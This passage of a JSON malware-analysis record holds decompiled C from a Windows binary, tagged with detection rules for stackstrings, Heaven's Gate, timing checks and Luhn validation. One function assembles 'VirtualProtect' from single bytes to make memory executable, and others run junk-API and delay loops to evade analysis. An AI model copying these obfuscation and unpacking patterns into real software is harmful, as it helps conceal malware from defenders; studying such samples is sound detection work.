        "decompiled_code": "\nvoid __cdecl fcn.00403490(int32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    for (arg_ch = arg_ch >> 3; arg_ch != 0; arg_ch = arg_ch - 1) {\n        if (*0x5cfd54 == 0xb7d) {\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasExesLengthW)();\n        }\n        if (*0x5cfd54 == 0x1c) {\n            (*_sym.imp.KERNEL32.dll_OpenMutexA)(0, 0, 0x40131c);\n            (*_sym.imp.KERNEL32.dll_EnumDateFormatsA)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_EnumSystemCodePagesW)(0, 0);\n        }\n        fcn.0040337e(arg_8h, arg_10h);\n        arg_8h = arg_8h + 8;\n    }\n    return;\n}\n",
        "token_count": 221
    },
    "00403668": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.00403668(void)\n\n{\n    uint var_4h;\n    \n    *0x5b6b0e = 0x33;\n    *0x5b6b0f = 0x32;\n    *0x5b6b13 = 0x6c;\n    *0x5b6b12 = 0x6c;\n    *0x5b6b0b = 0x6e;\n    *0x5b6b0d = 0x6c;\n    *0x5b6b08 = 0x6b;\n    *0x5b6b0c = 0x65;\n    *0x5b6b0a = 0x72;\n    *0x5b6b10 = 0x2e;\n    *0x5b6b11 = 100;\n    *0x5b6b09 = 0x65;\n    *0x5b6b14 = 0;\n    *0x5cfd50 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0x5b6b08);\n    *0x5b6b13 = 0x65;\n    *0x5b6b09 = 0x69;\n    *0x5b6b0c = 0x75;\n    *0x5b6b0e = 0x6c;\n    *0x5b6b0d = 0x61;\n    *0x5b6b11 = 0x6f;\n    *0x5b6b15 = 0x74;\n    *0x5b6b08 = 0x56;\n    *0x5b6b14 = 99;\n    *0x5b6b0f = 0x50;\n    *0x5b6b16 = 0;\n    *0x5b6b0b = 0x74;\n    *0x5b6b12 = 0x74;\n    *0x5b6b0a = 0x72;\n    *0x5b6b10 = 0x72;\n    *0x5b6b04 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x5cfd50, 0x5b6b08);\n    (**0x5b6b04)(*0x5cf900, *0x5cfd54, 0x40, &var_4h);\n    return;\n}\n",
        "token_count": 557
    },
    "0040333e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040333e(uint *arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    *arg_8h = arg_10h;\n    return;\n}\n",
        "token_count": 55
    },
    "0040365a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040365a(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "0040377a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lpCollectDataTimeout\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: lpState\n// WARNING: Variable defined which should be unmapped: lpCurInstances\n// WARNING: Variable defined which should be unmapped: lpMaxCollectionCount\n// WARNING: Variable defined which should be unmapped: lpNumberOfBytesWritten\n\nuint fcn.0040377a(void)\n\n{\n    code *pcVar1;\n    int32_t unaff_ESI;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t unaff_EDI;\n    uchar auStackY16516 [2048];\n    uchar auStackY14468 [1024];\n    uchar auStackY13444 [2048];\n    uchar auStackY11396 [1024];\n    uchar auStackY10372 [2048];\n    uchar auStackY8324 [1024];\n    uint lpszShortPath;\n    uint lpBuffer;\n    uint lpszReturnBuffer;\n    uint lpStruct;\n    uint lpUserName;\n    uint lpszVolumeName;\n    uint uStackY484;\n    uint uStackY480;\n    uint uStackY476;\n    uint uStackY472;\n    uint *puStackY468;\n    uint uStackY464;\n    uint uStackY460;\n    uint *puStackY456;\n    uint *puStackY452;\n    uint uStackY448;\n    uint uStackY444;\n    uint uStackY440;\n    uint uStackY436;\n    uint uStackY432;\n    uchar *puStackY428;\n    uint *puStackY424;\n    uint uStackY420;\n    uint uStackY416;\n    uint *puStackY412;\n    uint uStackY408;\n    uint uStackY404;\n    uint uStackY400;\n    uint uStackY396;\n    uint uStackY392;\n    uint *puStackY388;\n    uint uStackY384;\n    uint uStackY380;\n    uint uStackY376;\n    uint uStackY372;\n    uint uStackY368;\n    uint uStackY364;\n    uint *puStackY360;\n    uint *puStackY356;\n    uint uStackY352;\n    uint uStackY348;\n    uint uStackY344;\n    uint uStackY340;\n    uint uStackY336;\n    uint uStackY332;\n    uchar *puStackY328;\n    uint uStackY324;\n    uint *puStackY320;\n    uint *puStackY316;\n    uint uStackY312;\n    uint uStackY308;\n    uint uStackY304;\n    uint uStackY300;\n    uint uStackY296;\n    uint uStackY292;\n    uint *puStackY288;\n    uint *puStackY284;\n    uint uStackY280;\n    uint uStackY276;\n    uint uStackY272;\n    uint uStackY268;\n    uchar *puStackY264;\n    uint *puStackY260;\n    uint uStackY256;\n    uchar *puStackY252;\n    uint uStackY248;\n    uint uStackY244;\n    uint *puStackY240;\n    uint uStackY236;\n    uint uStackY232;\n    uint uStackY228;\n    uint uStackY224;\n    uint uStackY220;\n    uint uStackY216;\n    uint uStackY212;\n    uint uStackY208;\n    uint uStackY204;\n    uchar *puStackY200;\n    uint *puStackY196;\n    uint uStackY192;\n    uint uStackY188;\n    uint uStackY184;\n    uint uStackY180;\n    uint uStackY176;\n    uint uStackY172;\n    uint uStackY168;\n    uint uStackY164;\n    uint uStackY160;\n    uint uStackY156;\n    uint uStackY152;\n    uint uStackY148;\n    uint uStackY144;\n    uint uStackY140;\n    uint *puStackY136;\n    uint uStackY132;\n    int32_t iStackY128;\n    uint uStackY124;\n    int32_t var_74h;\n    uint *hEvent;\n    uint uStackY112;\n    uint uStackY108;\n    uint uStackY104;\n    uint uStackY100;\n    uint uStackY96;\n    uint *var_58h;\n    uchar *puStackY88;\n    uint uStackY84;\n    uint uStackY80;\n    uint lpOverlapped;\n    uint *var_44h;\n    uint uStackY68;\n    uint *puStackY64;\n    uint *puStackY60;\n    uint var_34h;\n    uint *lpFilePart;\n    uint lpBytesRead;\n    uint *lpNumberOfEventsWritten;\n    uint *nSize;\n    uint *ListHead;\n    uint *var_1ch;\n    uint *var_18h;\n    uint32_t lpState;\n    uint lpCurInstances;\n    uint32_t lpCollectDataTimeout;\n    int32_t lpNumberOfBytesWritten;\n    int32_t lpMaxCollectionCount;\n    \n    lpMaxCollectionCount = 0x403787;\n    fcn.00404e90();\n    iVar2 = 0;\n    lpCollectDataTimeout = unaff_EDI;\n    lpNumberOfBytesWritten = unaff_ESI;\n    do {\n        if (iVar2 == 0x13e6) {\n            *0x5cfd54 = *0x5cfd54 + 0x38d6;\n        }\n        if (*0x5cfd54 == 0xbc4) {\n            lpCurInstances = 0x4013f0;\n            lpState = 0x4037b8;\n            (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x31a4c2);\n    lpCurInstances = 0x4037c6;\n    fcn.00403766();\n    uVar3 = 0;\n    if (*0x5cfd54 != 0) {\n        do {\n            lpState = 0x4037d6;\n            lpCollectDataTimeout = uVar3;\n            fcn.004034f6(uVar3);\n            if (*0x5cfd54 == 0x1af) {\n                lpState = 0;\n                var_18h = &fcn.0040377a::lpUserName;\n                var_1ch = &fcn.0040377a::lpCollectDataTimeout;\n                ListHead = &fcn.0040377a::lpMaxCollectionCount;\n                nSize = &fcn.0040377a::lpCurInstances;\n                lpNumberOfEventsWritten = &fcn.0040377a::lpState;\n                lpBytesRead = 0;\n                lpFilePart = 0x403801;\n                (*_sym.imp.KERNEL32.dll_GetNamedPipeHandleStateW)();\n                lpFilePart = &fcn.0040377a::var_18h;\n                var_34h = 0x40380b;\n                (*_sym.imp.KERNEL32.dll_InterlockedDecrement)();\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *0x5cfd54);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_MoveFileW;\n    lpMaxCollectionCount = 0x91973f;\n    do {\n        if (*0x5cfd54 == 0x465) {\n            lpCurInstances = 0x403837;\n            (*_sym.imp.KERNEL32.dll_GetConsoleAliasExesLengthA)();\n            lpCurInstances = 0;\n            lpState = 0;\n            var_18h = NULL;\n            var_1ch = NULL;\n            ListHead = 0x403841;\n            (*_sym.imp.KERNEL32.dll_EnumCalendarInfoA)();\n            ListHead = NULL;\n            nSize = NULL;\n            lpNumberOfEventsWritten = 0x403849;\n            (*_sym.imp.KERNEL32.dll_GetConsoleMode)();\n            lpNumberOfEventsWritten = NULL;\n            lpBytesRead = 0;\n            lpFilePart = NULL;\n            var_34h = 0x403852;\n            (*_sym.imp.KERNEL32.dll_EnumDateFormatsA)();\n            var_34h = 0;\n            puStackY60 = &fcn.0040377a::var_18h;\n            puStackY64 = 0x40385d;\n            (*_sym.imp.KERNEL32.dll_InterlockedExchangeAdd)();\n            puStackY64 = NULL;\n            uStackY68 = 0;\n            var_44h = &fcn.0040377a::lpState;\n            lpOverlapped = 0x403869;\n            (*_sym.imp.KERNEL32.dll_InterlockedCompareExchange)();\n            lpOverlapped = 0;\n            uStackY80 = 0x403870;\n            (*_sym.imp.KERNEL32.dll_ConvertThreadToFiber)();\n            uStackY80 = 0;\n            uStackY84 = 0;\n            puStackY88 = &stack0xffffdf7c;\n            var_58h = NULL;\n            uStackY96 = 0;\n            uStackY100 = 0x403881;\n            (*_sym.imp.KERNEL32.dll_GetPrivateProfileStructA)();\n            uStackY100 = 0;\n            uStackY104 = 0;\n            uStackY108 = 0;\n            uStackY112 = 0;\n            hEvent = 0x40388b;\n            (*_sym.imp.KERNEL32.dll_GetOverlappedResult)();\n            hEvent = &fcn.0040377a::var_58h;\n            var_74h = 0x403895;\n            (*_sym.imp.KERNEL32.dll_GetConsoleSelectionInfo)();\n            var_74h = 0;\n            uStackY124 = 0;\n            iStackY128 = 0;\n            uStackY132 = 0x40389e;\n            (*_sym.imp.KERNEL32.dll_FindResourceW)();\n            uStackY132 = 0;\n            puStackY136 = 0x4038a5;\n            (*_sym.imp.KERNEL32.dll_DeleteAtom)();\n            puStackY136 = &fcn.0040377a::lpNumberOfEventsWritten;\n            uStackY140 = 0;\n            uStackY144 = 0;\n            uStackY148 = 0;\n            uStackY152 = 0x4038b2;\n            (*_sym.imp.KERNEL32.dll_WriteConsoleInputW)();\n            uStackY152 = 0;\n            uStackY156 = 0;\n            uStackY160 = 0x4038ba;\n            (*_sym.imp.KERNEL32.dll_SetCommState)();\n            uStackY160 = 0;\n            uStackY164 = 0x4038c1;\n            (*_sym.imp.KERNEL32.dll_GlobalUnfix)();\n            uStackY164 = 0;\n            uStackY168 = 0x4038c8;\n            (*_sym.imp.KERNEL32.dll_LocalLock)();\n            uStackY168 = 0;\n            uStackY172 = 0;\n            uStackY176 = 0;\n            uStackY180 = 0x4038d1;\n            (*_sym.imp.KERNEL32.dll_OpenMutexA)();\n            uStackY180 = 0;\n            uStackY184 = 0;\n            uStackY188 = 0x4038d5;\n            (*pcVar1)();\n            uStackY188 = 0;\n            uStackY192 = 0;\n            puStackY196 = 0x4038dd;\n            (*_sym.imp.KERNEL32.dll_LocalShrink)();\n            puStackY196 = &fcn.0040377a::hEvent;\n            puStackY200 = 0x4038e7;\n            (*_sym.imp.KERNEL32.dll_ResetEvent)();\n            puStackY200 = &stack0xffffc77c;\n            uStackY204 = 0;\n            uStackY208 = 0x4038f5;\n            (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsA)();\n            uStackY208 = 0x40140c;\n            uStackY212 = 0x401440;\n            uStackY216 = 0x403901;\n            (*pcVar1)();\n            uStackY216 = 0;\n            uStackY220 = 0;\n            uStackY224 = 0;\n            uStackY228 = 0;\n            uStackY232 = 0;\n            uStackY236 = 0x40390c;\n            (*_sym.imp.KERNEL32.dll_ReadFile)();\n            uStackY236 = 0;\n            puStackY240 = &fcn.0040377a::lpszShortPath;\n            uStackY244 = 0;\n            uStackY248 = 0x40391b;\n            (*_sym.imp.KERNEL32.dll_GetShortPathNameW)();\n            uStackY248 = 0;\n            puStackY252 = &stack0xffffd77c;\n            uStackY256 = 0;\n            puStackY260 = 0x40392a;\n            (*_sym.imp.KERNEL32.dll_GetVolumePathNameW)();\n            puStackY260 = &fcn.0040377a::nSize;\n            puStackY264 = &stack0xffffcb7c;\n            uStackY268 = 0;\n            uStackY272 = 0x40393c;\n            (*_sym.imp.KERNEL32.dll_GetComputerNameExW)();\n            uStackY272 = 0;\n            uStackY276 = 0;\n            uStackY280 = 0;\n            puStackY284 = 0x403945;\n            (*_sym.imp.KERNEL32.dll_CopyFileA)();\n            puStackY284 = &fcn.0040377a::lpFilePart;\n            puStackY288 = &fcn.0040377a::lpBuffer;\n            uStackY292 = 0;\n            uStackY296 = 0;\n            uStackY300 = 0;\n            uStackY304 = 0;\n            uStackY308 = 0x40395a;\n            (*_sym.imp.KERNEL32.dll_SearchPathA)();\n            uStackY308 = 0;\n            uStackY312 = 0;\n            puStackY316 = 0x403962;\n            (*_sym.imp.KERNEL32.dll_ActivateActCtx)();\n            lpOverlapped = 0;\n            var_44h = NULL;\n            uStackY68 = 0;\n            puStackY64 = NULL;\n            puStackY60 = NULL;\n            puStackY316 = &fcn.0040377a::lpOverlapped;\n            puStackY320 = &fcn.0040377a::lpBytesRead;\n            uStackY324 = 0;\n            puStackY328 = &stack0xffffd37c;\n            uStackY332 = 0;\n            uStackY336 = 0;\n            uStackY340 = 0;\n            uStackY344 = 0x403987;\n            (*_sym.imp.KERNEL32.dll_TransactNamedPipe)();\n            uStackY344 = 0;\n            uStackY348 = 0x40398e;\n            (*_sym.imp.KERNEL32.dll_GetFileAttributesW)();\n            uStackY348 = 0;\n            uStackY352 = 0;\n            puStackY356 = &fcn.0040377a::lpszReturnBuffer;\n            puStackY360 = 0x40399d;\n            (*_sym.imp.KERNEL32.dll_GetPrivateProfileSectionNamesA)();\n            puStackY360 = &fcn.0040377a::lpCurInstances;\n            uStackY364 = 0;\n            uStackY368 = 0;\n            uStackY372 = 0;\n            uStackY376 = 0;\n            uStackY380 = 0x4039ab;\n            (*_sym.imp.KERNEL32.dll_GetStringTypeExW)();\n            uStackY380 = 0;\n            uStackY384 = 0;\n            puStackY388 = &fcn.0040377a::lpStruct;\n            uStackY392 = 0;\n            uStackY396 = 0;\n            uStackY400 = 0x4039bc;\n            (*_sym.imp.KERNEL32.dll_WritePrivateProfileStructA)();\n            uStackY400 = 0;\n            uStackY404 = 0;\n            uStackY408 = 0;\n            puStackY412 = 0x4039c5;\n            (*_sym.imp.KERNEL32.dll_WritePrivateProfileSectionW)();\n            ListHead = NULL;\n            var_1ch = NULL;\n            puStackY412 = &fcn.0040377a::ListHead;\n            uStackY416 = 0x4039d5;\n            (*_sym.imp.KERNEL32.dll_InterlockedFlushSList)();\n            uStackY416 = 0;\n            uStackY420 = 0;\n            puStackY424 = 0x4039dd;\n            (*_sym.imp.KERNEL32.dll_EnumSystemLocalesW)();\n            puStackY424 = &fcn.0040377a::var_34h;\n            puStackY428 = &stack0xffffbf7c;\n            uStackY432 = 0x4039ee;\n            (*_sym.imp.KERNEL32.dll_GetComputerNameW)();\n            uStackY432 = 0;\n            uStackY436 = 0;\n            uStackY440 = 0;\n            uStackY444 = 0;\n            uStackY448 = 0x4039f8;\n            (*_sym.imp.KERNEL32.dll_VerSetConditionMask)();\n            uStackY448 = 0;\n            puStackY452 = &fcn.0040377a::lpszVolumeName;\n            puStackY456 = 0x403a06;\n            (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n            puStackY456 = &fcn.0040377a::lpCollectDataTimeout;\n            uStackY460 = 0;\n            uStackY464 = 0;\n            puStackY468 = &fcn.0040377a::lpNumberOfBytesWritten;\n            uStackY472 = 0;\n            uStackY476 = 0;\n            uStackY480 = 0;\n            lpCollectDataTimeout = 0;\n            uStackY484 = 0x403a1c;\n            (*_sym.imp.KERNEL32.dll_BackupWrite)();\n        }\n        lpMaxCollectionCount = lpMaxCollectionCount + -1;\n    } while (lpMaxCollectionCount != 0);\n    uVar3 = 0;\n    do {\n        if (uVar3 < 0x1c860) {\n            lpCurInstances = 0x403a35;\n            (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            lpCurInstances = 0;\n            lpState = 0;\n            var_18h = NULL;\n            var_1ch = 0x403a3e;\n            (*_sym.imp.GDI32.dll_GetBoundsRect)();\n        }\n    } while ((((uVar3 < 0x1e97427c) || (lpNumberOfBytesWritten == 0xace7c8)) || (var_74h == 0xad642ec)) &&\n            (uVar3 = uVar3 + 1,  uVar3 < 0x8e2a6250));\n    iVar2 = 0;\n    do {\n        if (*0x5cfd54 == 0x92) {\n            lpCurInstances = 0;\n            lpState = 0;\n            var_18h = NULL;\n            var_1ch = NULL;\n            ListHead = NULL;\n            nSize = NULL;\n            lpNumberOfEventsWritten = NULL;\n            lpBytesRead = 0x403a7c;\n            (*_sym.imp.KERNEL32.dll_DuplicateHandle)();\n        }\n        if (iVar2 == 0xa9a9) {\n            lpCurInstances = 0x5b6b08;\n            lpState = 0x403a8f;\n            *0x5cfd50 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)();\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x25563);\n    *0x5b6b08 = 0;\n    iVar2 = 0;\n    do {\n        if (iVar2 == 0x148) {\n            lpCurInstances = 0x403ab2;\n            fcn.00403668();\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x427fa7);\n    lpCurInstances = 0x413010;\n    lpState = *0x5cfd54;\n    var_18h = *0x5cf900;\n    var_1ch = 0x403ad1;\n    fcn.00403490(*0x5cf900, *0x5cfd54, 0x413010);\n    iVar2 = 0;\n    do {\n        if (*0x5cfd54 == 0x10) {\n            var_1ch = NULL;\n            ListHead = 0x403ae3;\n            (*_sym.imp.KERNEL32.dll_InterlockedDecrement)();\n        }\n        if (iVar2 == 0x2f7e4) {\n            var_1ch = 0x403af0;\n            fcn.0040365a();\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x48122);\n    var_1ch = 0x403afe;\n    fcn.00403297();\n    if (*0x5cfd54 == 0x58c) {\n        var_1ch = NULL;\n        ListHead = 0x403b15;\n        (*_sym.imp.KERNEL32.dll_LocalFlags)();\n        ListHead = NULL;\n        nSize = &fcn.0040377a::lpszVolumeName;\n        lpNumberOfEventsWritten = 0x403b23;\n        (*_sym.imp.KERNEL32.dll_FindFirstVolumeA)();\n        lpNumberOfEventsWritten = NULL;\n        lpBytesRead = 0;\n        lpFilePart = 0x403b2b;\n        (*_sym.imp.KERNEL32.dll_GetConsoleFontSize)();\n        lpMaxCollectionCount = 0;\n        lpFilePart = &fcn.0040377a::lpNumberOfBytesWritten;\n        var_34h = 0;\n        puStackY64 = &fcn.0040377a::lpCurInstances;\n        puStackY60 = NULL;\n        uStackY68 = 0;\n        var_44h = 0x403b49;\n        (*_sym.imp.KERNEL32.dll_ReadConsoleOutputAttribute)();\n        var_44h = NULL;\n        lpOverlapped = 0;\n        uStackY80 = 0x403b51;\n        (*_sym.imp.KERNEL32.dll_CreateJobObjectW)();\n        uStackY80 = 0x401458;\n        uStackY84 = 0x403b5c;\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleW)();\n        uStackY84 = 0;\n        puStackY88 = NULL;\n        var_58h = &fcn.0040377a::lpStruct;\n        uStackY96 = 0;\n        uStackY100 = 0;\n        uStackY104 = 0;\n        uStackY108 = 0;\n        uStackY112 = 0x403b6f;\n        (*_sym.imp.KERNEL32.dll_FormatMessageA)();\n        uStackY112 = 0;\n        hEvent = NULL;\n        var_74h = 0;\n        uStackY124 = 0x403b78;\n        (*_sym.imp.KERNEL32.dll_FindResourceW)();\n        uStackY124 = 0;\n        iStackY128 = lpNumberOfBytesWritten;\n        uStackY132 = 0;\n        puStackY136 = 0x403b83;\n        (*_sym.imp.KERNEL32.dll_SetHandleInformation)();\n        puStackY136 = NULL;\n        uStackY140 = 0;\n        uStackY144 = 0x403b8b;\n        (*_sym.imp.KERNEL32.dll_CancelTimerQueueTimer)();\n        uStackY144 = 0;\n        uStackY148 = 0x403b92;\n        (*_sym.imp.KERNEL32.dll_InterlockedDecrement)();\n    }\n    var_1ch = 0x403b97;\n    fcn.00403654();\n    return 0;\n}\n",
        "token_count": 5372
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain obfuscated stackstrings",
            "contain loop",
            "create directory",
            "move file",
            "copy file",
            "set console window title"
        ],
        "decompiled_code": "\nuint main(void)\n\n{\n    int32_t iVar1;\n    uint lpString1;\n    uint var_ach;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint uExitCode;\n    \n    var_88h = 0x4e68b279;\n    var_3ch = 0xaeba94e2;\n    var_44h = 0xa549289f;\n    var_38h = 0x1e9cb630;\n    var_64h = 0xa5aa0364;\n    uExitCode = 0x3ce246a5;\n    var_34h = 0xf3cb2db0;\n    var_6ch = 0x7ca19048;\n    var_58h = 0x1c08b058;\n    var_60h = 0x94d763b8;\n    var_90h = 0xa52d63a6;\n    var_20h = 0xe4d18634;\n    var_24h = 0x7a815d21;\n    var_78h = 0x63860979;\n    var_ch = 0x20ce1d5;\n    var_28h = 0xe4924575;\n    var_50h = 0x2eefa4a8;\n    var_2ch = 0xfdf29d86;\n    var_68h = 0x8e7447b6;\n    var_4ch = 0x74c8ead3;\n    var_80h = 0x77b1668a;\n    var_40h = 0xae43e453;\n    var_14h = 0xa31b2925;\n    var_8h = 0xa717e16b;\n    var_10h = 0x7972aa5;\n    var_1ch = 0xd35f6e90;\n    var_30h = 0xa2d3262c;\n    var_70h = 0x416a41bf;\n    var_84h = 0x766d327e;\n    var_8ch = 0x8879bd3c;\n    var_48h = 0xf04ca510;\n    var_5ch = 0xe42d5047;\n    var_74h = 0xc65f797b;\n    var_54h = 0xd66afa29;\n    var_7ch = 0xbb5593ae;\n    var_18h = 0xd4f34e57;\n    if (*0x5cfd54 == 0x9e) {\n        fcn.00405798(0, 0);\n        fcn.004056e2(0);\n        fcn.00404ab1();\n        fcn.004055cb();\n        fcn.004055c0(0);\n        fcn.004054e0(0);\n        fcn.00405403(0);\n        fcn.004053c3(0, 0);\n        fcn.0040538f(0);\n        fcn.00404b42();\n    }\n    *0x5cfd54 = *0x4132e4;\n    if (*0x4132e4 == 0x81) {\n        (*_sym.imp.KERNEL32.dll_lstrcpynA)(&lpString1, 0x401490, 0);\n        (*_sym.imp.KERNEL32.dll_CopyFileA)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_TerminateJobObject)(0, uExitCode);\n        (*_sym.imp.KERNEL32.dll_GlobalFindAtomW)(0);\n        (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x4014dc);\n        (*_sym.imp.KERNEL32.dll_CreateDirectoryExA)(0x4014f0, 0x4014e8, 0);\n        (*_sym.imp.KERNEL32.dll_lstrlenW)(0x4014fc);\n        (*_sym.imp.KERNEL32.dll_ClearCommError)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_GetSystemWindowsDirectoryA)(0, 0);\n        (*_sym.imp.KERNEL32.dll_SetVolumeMountPointA)(0x401518, 0x401508);\n        (*_sym.imp.KERNEL32.dll_SetConsoleTitleW)(0);\n        (*_sym.imp.KERNEL32.dll_InterlockedExchange)(&var_94h, 0);\n        (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(0);\n        (*_sym.imp.KERNEL32.dll_GetThreadPriority)(0);\n        (*_sym.imp.KERNEL32.dll_AddAtomW)(0x401520);\n        (*_sym.imp.KERNEL32.dll_MoveFileW)(0, 0);\n        (*_sym.imp.KERNEL32.dll_GenerateConsoleCtrlEvent)(0, 0);\n        (*_sym.imp.KERNEL32.dll_ZombifyActCtx)(0);\n        (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0x401530);\n    }\n    iVar1 = 0x79a863;\n    do {\n        if (*0x5cfd54 == 0x4c5) {\n            (*_sym.imp.KERNEL32.dll_GetNamedPipeInfo)(0, 0, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_WaitForSingleObjectEx)(0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_SetThreadAffinityMask)(0, 0);\n        }\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    *0x5d0168 = *0x413008;\n    fcn.0040377a();\n    return 0;\n}\n",
        "token_count": 1497
    },
    "004043c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004043c2(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.00403251(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 63
    },
    "004043dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004043dd(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.0040326d(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 63
    },
    "00404413": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00404413(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint *arg_ch;\n    uint var_1h;\n    \n    arg_ch = &var_1h;\n    *(in_ECX + 0x14) = arg_8h;\n    iVar1 = fcn.0040428a();\n    fcn.0040322e(iVar1 + arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 127
    },
    "0040443a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040443a(void)\n\n{\n    return 0x9249249;\n}\n",
        "token_count": 22
    },
    "00404520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404520(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t arg_14h;\n    int32_t iVar2;\n    int32_t arg_ch_00;\n    int32_t iVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x14) < arg_8h) {\n        fcn.00404bd9();\n    }\n    uVar1 = *(in_ECX + 0x14) - arg_8h;\n    if (uVar1 < arg_ch) {\n        arg_ch = uVar1;\n    }\n    if (arg_ch != 0) {\n        arg_14h = uVar1 - arg_ch;\n        iVar2 = fcn.0040428a();\n        iVar2 = iVar2 + arg_8h + arg_ch;\n        arg_ch_00 = *(in_ECX + 0x18) - arg_8h;\n        iVar3 = fcn.0040428a();\n        fcn.004044a9(iVar3 + arg_8h, arg_ch_00, iVar2, arg_14h);\n        fcn.00404413(*(in_ECX + 0x14) - arg_ch);\n    }\n    return;\n}\n",
        "token_count": 287
    },
    "00404792": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404792(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    int32_t in_ECX;\n    uint arg_ch_00;\n    uint32_t arg_14h;\n    \n    uVar2 = fcn.00404283();\n    if (uVar2 < arg_ch) {\n        fcn.00404bd9();\n    }\n    iVar3 = fcn.00404283();\n    uVar2 = iVar3 - arg_ch;\n    if (arg_10h < iVar3 - arg_ch) {\n        uVar2 = arg_10h;\n    }\n    if (in_ECX == arg_8h) {\n        fcn.00404520(uVar2 + arg_ch, 0xffffffff);\n        fcn.00404520(0, arg_ch);\n    }\n    else {\n        cVar1 = fcn.004046ca(uVar2, 0);\n        if (cVar1 != '\\0') {\n            arg_14h = uVar2;\n            iVar3 = fcn.0040428a();\n            iVar3 = iVar3 + arg_ch;\n            arg_ch_00 = *(in_ECX + 0x18);\n            arg_8h_00 = fcn.0040428a();\n            fcn.00404485(arg_8h_00, arg_ch_00, iVar3, arg_14h);\n            fcn.00404413(uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 359
    },
    "004049bf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
